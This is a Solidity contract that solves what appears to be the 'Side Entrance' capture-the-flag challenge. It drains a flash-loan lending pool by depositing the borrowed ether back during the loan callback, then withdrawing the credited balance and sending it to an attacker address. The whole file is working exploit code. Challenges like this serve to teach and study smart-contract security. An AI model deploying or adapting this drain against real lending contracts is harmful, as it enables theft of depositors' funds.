pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";

//@dev Interface of the pool to be drained
interface LenderPool {
	function deposit() external payable;

	function withdraw() external;

	function flashLoan(uint256 lendAmount) external;
}


/*
@title Side Entrance challenge solver
@dev SideEntranceLenderPool.flashLoan sends ether to an arbitrary account.
*/
contract SideEntranceExploit {
	
	LenderPool _pool;
	uint256 _poolBalance;
	//@param _pool The lending pool to be drained
	//@attacker The attacking EOA
	/*@dev  FlashLoan calls the execute function before checking our balance. 
	We deposit the loan to our address, pass the check and withdraw our new balance.
	*/ 
	function attack(LenderPool pool, address payable attacker) 
		public
	{	
		_pool = pool;
		_poolBalance = address(_pool).balance;	
	    	_pool.flashLoan(_poolBalance);
		_pool.withdraw();
		attacker.transfer(_poolBalance);		
	}

	//Arbitrary function called by flashLoan to make the deposit
	function execute() external payable {
		_pool.deposit{value: _poolBalance}();
	}

	//@dev default fallback to receive ether via withdraw
	receive() external payable {}
}
